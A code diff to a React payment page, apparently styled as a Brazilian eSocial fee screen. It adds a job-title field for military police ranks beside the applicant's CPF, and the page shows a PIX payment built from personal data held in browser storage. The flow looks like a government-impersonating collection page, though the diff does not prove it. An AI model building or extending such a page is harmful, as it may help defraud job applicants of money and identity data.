@@ -13,7 +13,13 @@ interface UserInfo {
   email: string;
   telefone: string;
   gender: string;
+  cargo: string;
 }
+
+const CARGO_MAP: Record<string, string> = {
+  'soldado-pm': 'Soldado de 2ª Classe PM',
+  'oficial-pm': 'Aspirante-a-Oficial PM',
+};
 
 interface PixData {
   id: string;
@@ -42,7 +48,7 @@ export default function ESocialPagamentoPage() {
   const [, navigate] = useLocation();
 
   const [userInfo, setUserInfo] = useState<UserInfo>({
-    firstName: '', fullName: '', cpf: '', email: '', telefone: '', gender: 'M',
+    firstName: '', fullName: '', cpf: '', email: '', telefone: '', gender: 'M', cargo: '',
   });
   const [pixData, setPixData] = useState<PixData | null>(null);
   const [isLoading, setIsLoading] = useState(true);
@@ -62,24 +68,23 @@ export default function ESocialPagamentoPage() {
     window.scrollTo(0, 0);
 
     let parsedUser: any = null;
-    let parsedCandidate: any = null;
+    let applicationData: any = null;
 
     try { parsedUser = JSON.parse(localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin') || 'null'); } catch (_) {}
-    try {
-      const raw = localStorage.getItem('candidateData');
-      if (raw) { const d = JSON.parse(raw); parsedCandidate = d.candidate || d; }
-    } catch (_) {}
+    try { applicationData = JSON.parse(localStorage.getItem('applicationData') || 'null'); } catch (_) {}
 
-    const fullName = parsedUser?.nomeCompleto || parsedCandidate?.nomeCompleto || parsedCandidate?.fullName || '';
+    const fullName = parsedUser?.nomeCompleto || '';
     const rawFirst = fullName.split(' ')[0] || '';
     const firstName = rawFirst ? rawFirst.charAt(0).toUpperCase() + rawFirst.slice(1).toLowerCase() : '';
-    const cpf      = parsedUser?.cpf || parsedCandidate?.cpf || '';
-    const email    = parsedCandidate?.capturaData?.email || parsedUser?.email || 'candidato@gmail.com';
-    const telefone = parsedCandidate?.capturaData?.telefone || parsedUser?.telefone || '';
-    const gender   = parsedUser?.sexo || parsedUser?.genero || parsedUser?.gender ||
-                     parsedCandidate?.genero || parsedCandidate?.gender || 'M';
+    const cpf      = parsedUser?.cpf || '';
+    const email    = parsedUser?.email || 'candidato@gmail.com';
+    const telefone = parsedUser?.telefone || '';
+    const gender   = parsedUser?.sexo || parsedUser?.genero || parsedUser?.gender || 'M';
 
-    setUserInfo({ firstName, fullName, cpf, email, telefone, gender });
+    const positionId = applicationData?.positionId || applicationData?.position_id || '';
+    const cargo = CARGO_MAP[positionId] || applicationData?.positionTitle || parsedUser?.cargo || 'Soldado de 2ª Classe PM';
+
+    setUserInfo({ firstName, fullName, cpf, email, telefone, gender, cargo });
 
     // Resolve DAE amount + check PIX cache (30 min TTL)
     const resolveValor = async () => {
@@ -330,6 +335,10 @@ export default function ESocialPagamentoPage() {
             <div className="flex justify-between">
               <span className="text-gray-500">CPF</span>
               <span className="text-gray-700">{userInfo.cpf || '---'}</span>
+            </div>
+            <div className="flex justify-between">
+              <span className="text-gray-500">Cargo</span>
+              <span className="text-gray-700 truncate max-w-[200px]">{userInfo.cargo || 'Soldado de 2ª Classe PM'}</span>
             </div>
             <div className="flex justify-between">
               <span className="text-gray-500">Competência</span>
